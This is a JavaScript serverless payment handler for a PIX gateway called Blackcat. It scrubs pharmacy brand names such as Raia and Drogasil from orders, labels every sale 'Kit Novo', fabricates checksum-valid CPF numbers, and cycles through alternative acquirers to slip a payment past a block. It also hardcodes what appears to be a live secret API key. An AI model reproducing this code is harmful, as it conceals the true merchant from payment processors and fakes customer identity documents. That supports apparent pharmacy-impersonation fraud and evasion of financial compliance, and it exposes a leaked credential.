import QRCode from 'qrcode';
import fs from 'fs';
import os from 'os';
import path from 'path';

// Mascaramento server-side rígido:
// A Blackcat receberá estritamente "Kit Novo", referência genérica "PED-..." e nenhum metadado ou menção a farmácia/raia
const MASKED_PRODUCT_NAME = 'Kit Novo';

const SINGLE_PAYMENT_STATE_FILE = path.join(os.tmpdir(), 'blackcat_single_payment.json');
let inMemorySinglePaymentDone = false;

export function isSinglePaymentDone() {
  if (inMemorySinglePaymentDone) return true;
  try {
    if (fs.existsSync(SINGLE_PAYMENT_STATE_FILE)) {
      const content = fs.readFileSync(SINGLE_PAYMENT_STATE_FILE, 'utf8');
      const data = JSON.parse(content);
      if (data && data.done) {
        inMemorySinglePaymentDone = true;
        return true;
      }
    }
  } catch (e) {}
  return false;
}

export function markSinglePaymentDone(txId, acquirer) {
  inMemorySinglePaymentDone = true;
  try {
    fs.writeFileSync(
      SINGLE_PAYMENT_STATE_FILE,
      JSON.stringify(
        {
          done: true,
          txId,
          acquirer,
          completedAt: new Date().toISOString(),
        },
        null,
        2
      ),
      'utf8'
    );
  } catch (e) {}
}

export function resetSinglePaymentState() {
  inMemorySinglePaymentDone = false;
  try {
    if (fs.existsSync(SINGLE_PAYMENT_STATE_FILE)) {
      fs.unlinkSync(SINGLE_PAYMENT_STATE_FILE);
    }
  } catch (e) {}
}

const BLACKCAT_ALTERNATIVE_ACQUIRERS = [
  'payzu',
  'suitpay',
  'asaas',
  'ezzebank',
  'celcoin',
  'primepag',
  'voluti',
  'mercadopago',
  'bspay',
  'fitbank',
  'iugu',
  'woovi',
  'starkbank',
  'santsbank',
  'fyhub',
  'pagsmile',
  null,
];

function sanitizeReference(ref) {
  if (!ref || typeof ref !== 'string') {
    return `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
  }
  let cleaned = ref
    .replace(/(?:raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)+/gi, 'PED')
    .replace(/(?:PED)+/g, 'PED')
    .replace(/--+/g, '-')
    .trim();

  if (!cleaned || cleaned === 'PED' || cleaned === 'PED-') {
    cleaned = `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
  }
  return cleaned;
}

function sanitizeEmail(email) {
  if (!email || typeof email !== 'string') return '';
  const e = email.toLowerCase().trim();
  if (e.includes('raia') || e.includes('farmacia') || e.includes('droga')) {
    const userPart = e.split('@')[0].replace(/(raia|droga|drogaria|farmacia|farma|drogasil|portal)/gi, '') || 'cliente';
    return `${userPart}@gmail.com`;
  }
  return email;
}

function sanitizeText(val) {
  if (!val || typeof val !== 'string') return '';
  return val.replace(/(raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)/gi, '').trim();
}

function generateValidCPF() {
  const digits = [];
  for (let i = 0; i < 9; i++) {
    digits.push(Math.floor(Math.random() * 10));
  }
  if (digits.every((d) => d === digits[0])) {
    digits[8] = (digits[8] + 1) % 10;
  }
  let sum1 = 0;
  for (let i = 0; i < 9; i++) sum1 += digits[i] * (10 - i);
  const rem1 = sum1 % 11;
  digits.push(rem1 < 2 ? 0 : 11 - rem1);

  let sum2 = 0;
  for (let i = 0; i < 10; i++) sum2 += digits[i] * (11 - i);
  const rem2 = sum2 % 11;
  digits.push(rem2 < 2 ? 0 : 11 - rem2);

  return digits.join('');
}

function buildBlackcatPayload(input) {
  const amount = typeof input?.amount === 'number' ? input.amount : parseInt(input?.amount, 10) || 0;
  const externalRef = sanitizeReference(input?.reference || input?.externalRef);

  const customerName = sanitizeText(input?.customer?.name) || 'Cliente';
  const customerEmail = sanitizeEmail(input?.customer?.email) || 'cliente@gmail.com';
  
  let customerPhone = input?.customer?.phone ? String(input.customer.phone).replace(/\D/g, '') : '';
  if (!customerPhone || customerPhone.length < 10) {
    customerPhone = '11999999999';
  }

  let docNumber = input?.customer?.document?.number || input?.customer?.document;
  if (typeof docNumber === 'string') {
    docNumber = docNumber.replace(/\D/g, '');
  } else {
    docNumber = '';
  }
  if (!docNumber || docNumber.length < 11) {
    docNumber = generateValidCPF();
  }

  const payload = {
    amount,
    currency: 'BRL',
    paymentMethod: 'pix',
    items: [
      {
        title: MASKED_PRODUCT_NAME,
        unitPrice: amount,
        quantity: 1,
        tangible: false,
      },
    ],
    customer: {
      name: customerName,
      email: customerEmail,
      phone: customerPhone,
      document: {
        number: docNumber,
        type: 'cpf',
      },
    },
    pix: {
      expiresInDays: 1,
    },
    externalRef,
    metadata: MASKED_PRODUCT_NAME,
  };

  const addr = input?.address || input?.shipping;
  if (addr && addr.street && addr.number) {
    const zipCode = addr.zipCode || addr.zipcode || '';
    const cleanZip = String(zipCode).replace(/\D/g, '');
    const cleanState = (addr.state || 'SP').toUpperCase().slice(0, 2);

    payload.shipping = {
      name: customerName,
      street: sanitizeText(addr.street) || addr.street,
      number: String(addr.number),
      complement: sanitizeText(addr.complement) || addr.complement || '',
      neighborhood: sanitizeText(addr.neighborhood) || addr.neighborhood || 'Centro',
      city: sanitizeText(addr.city) || addr.city || 'São Paulo',
      state: cleanState,
      zipCode: cleanZip.length === 8 ? cleanZip : '01001000',
    };
  }

  return payload;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-API-Key');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  const apiKey =
    process.env.BLACKCAT_API_KEY ||
    process.env.BLACKCAT_SECRET_KEY ||
    'sk_live_b1802bc43e0e87989c22d837fdbe9f688ff3c9ef2f6fbff4f820693d0ab32666';

  if (!apiKey) {
    return res.status(500).json({ success: false, error: 'BLACKCAT_API_KEY não configurada no servidor' });
  }

  try {
    const body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : (req.body || {});
    const basePayload = buildBlackcatPayload(body);

    // Permite resetar manualmente se desejado via body ou query
    if (body.resetSinglePayment === true || req.query?.reset === 'true') {
      resetSinglePaymentState();
      console.log('[Blackcat Vercel] Estado de pagamento único resetado.');
    }

    const singleDone = isSinglePaymentDone();
    let acquirersToTry;

    if (body.acquirer) {
      // Se enviado explicitamente no corpo, respeita a escolha
      acquirersToTry = [body.acquirer];
    } else if (singleDone) {
      // REGRA: "após esse pagamento ser gerado volte pra adquirente que esta selecionada no painel"
      // null indica à Blackcat que deve usar a adquirente selecionada no painel da conta
      console.log('[Blackcat Vercel] Pagamento único já foi gerado. Usando estritamente a adquirente selecionada no painel (padrão).');
      acquirersToTry = [null];
    } else {
      // REGRA: "só mude a adquirente para gerar um unico pagamento"
      // Tenta as adquirentes alternativas em cascata para este único pagamento
      console.log('[Blackcat Vercel] Gerando pagamento único com adquirente alternativa para desbloqueio...');
      acquirersToTry = BLACKCAT_ALTERNATIVE_ACQUIRERS;
    }

    let lastError = null;
    let lastData = null;
    let lastStatus = 500;

    for (const acquirer of acquirersToTry) {
      const currentPayload = { ...basePayload };
      if (acquirer) {
        currentPayload.acquirer = acquirer;
      } else {
        delete currentPayload.acquirer;
      }

      try {
        console.log(`[Blackcat Vercel] Tentando adquirente: ${acquirer || 'padrão do painel'}`);
        const response = await fetch('https://api.blackcatoficial.com/api/sales/create-sale', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-API-Key': apiKey,
          },
          body: JSON.stringify(currentPayload),
        });

        const data = await response.json();

        if (response.ok && data.success && data.data) {
          // Se gerou com adquirente alternativa e o pagamento único ainda não estava concluído:
          if (!singleDone && acquirer) {
            markSinglePaymentDone(data.data.transactionId, acquirer);
            console.log(`[Blackcat Vercel] Pagamento único gerado com sucesso via ${acquirer} (TxID: ${data.data.transactionId})! A partir de agora o sistema volta para a adquirente selecionada no painel.`);
          }

          const qrCode = data.data?.paymentData?.copyPaste || data.data?.paymentData?.qrCode || '';
          let qrCodeBase64 = data.data?.paymentData?.qrCodeBase64 || null;

          if ((!qrCodeBase64 || qrCodeBase64 === '') && qrCode) {
            try {
              qrCodeBase64 = await QRCode.toDataURL(qrCode, {
                width: 320,
                margin: 1,
                color: { dark: '#000000', light: '#ffffff' },
              });
            } catch (qrErr) {
              console.error('[Blackcat Vercel] Erro ao gerar QR Code base64:', qrErr);
            }
          }

          const formatted = {
            success: true,
            status: 'success',
            payment_status: data.data?.status?.toLowerCase() || 'pending',
            transaction_id: data.data?.transactionId || '',
            id: data.data?.transactionId || basePayload.externalRef,
            qr_code: qrCode,
            qr_code_base64: qrCodeBase64,
            amount: data.data?.amount || basePayload.amount,
            expires_at: data.data?.paymentData?.expiresAt || null,
            acquirer: acquirer || 'painel_padrao',
            raw: data.data,
          };

          console.log(`[Blackcat Vercel] Sucesso com adquirente ${acquirer || 'painel_padrao'}! TxID: ${formatted.transaction_id}`);
          return res.status(201).json({ success: true, data: formatted });
        }

        console.warn(`[Blackcat Vercel] Adquirente ${acquirer || 'painel_padrao'} falhou (Status ${response.status}):`, data.message || data.error);
        lastError = data.message || data.error || 'Erro ao processar adquirente na Blackcat';
        lastData = data;
        lastStatus = response.status || 500;
      } catch (subErr) {
        console.warn(`[Blackcat Vercel] Exceção na adquirente ${acquirer || 'painel_padrao'}:`, subErr.message);
        lastError = subErr.message;
      }
    }

    console.error('[Blackcat Vercel] Todas as tentativas falharam. Último erro:', lastError);
    return res.status(lastStatus).json({
      success: false,
      error: lastError || 'Erro ao criar venda na Blackcat após tentar adquirente',
      raw: lastData,
    });
  } catch (err) {
    console.error('[Blackcat Vercel] Erro interno:', err);
    return res.status(500).json({ success: false, error: err.message || 'Erro interno no proxy Blackcat' });
  }
}

